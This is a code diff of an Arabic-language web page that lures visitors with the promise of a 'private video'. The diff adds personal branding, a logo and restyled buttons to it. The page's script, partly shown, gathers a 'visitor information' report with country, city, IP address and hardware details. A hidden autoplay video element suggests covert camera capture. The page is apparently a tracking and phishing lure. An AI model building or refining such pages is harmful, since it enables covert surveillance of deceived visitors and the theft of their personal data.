@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📽️ فيديو خاص بك</title>
+  <title>عبود السراوي</title>
   <style>
     body {
       margin: 0;
@@ -17,15 +17,31 @@
       height: 100vh;
       text-align: center;
     }
+    .logo-container {
+      margin-bottom: 20px;
+    }
+    .logo {
+      width: 150px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
     h1 {
       font-size: 26px;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
     }
     p {
       color: #ccc;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
-    button {
+    .button-container {
+      display: flex;
+      gap: 20px;
+    }
+    button, .video-link {
       background: #ff0050;
       color: white;
       border: none;
@@ -34,6 +50,10 @@
       font-size: 18px;
       cursor: pointer;
       box-shadow: 0 0 10px #ff0050;
+      text-decoration: none;
+    }
+    button:hover, .video-link:hover {
+      background: #e60045;
     }
     video {
       display: none;
@@ -41,9 +61,15 @@
   </style>
 </head>
 <body>
-  <h1>📽️ اضغط لمشاهدة الفيديو</h1>
+  <div class="logo-container">
+    <img src="logo.png" alt="عبود السراوي" class="logo">
+  </div>
+  <h1>عبود السراوي</h1>
   <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
-  <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
+  <div class="button-container">
+    <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
+    <a href="https://your-video-link.com" class="video-link" target="_blank">اضغط هنا لمشاهدة الفيديو</a>
+  </div>
 
   <video id="video" autoplay playsinline></video>
 
@@ -112,7 +138,7 @@
       const cores = navigator.hardwareConcurrency || "غير معروف";
 
       const message = `
-📝 معلومات الزائر:
+📝 معلومات الزائر - عبود السراوي:
 🌍 الدولة: ${ipInfo.country_name} 
 🏙️ المدينة: ${ipInfo.city}
 🌐 IP: ${ipInfo.ip}
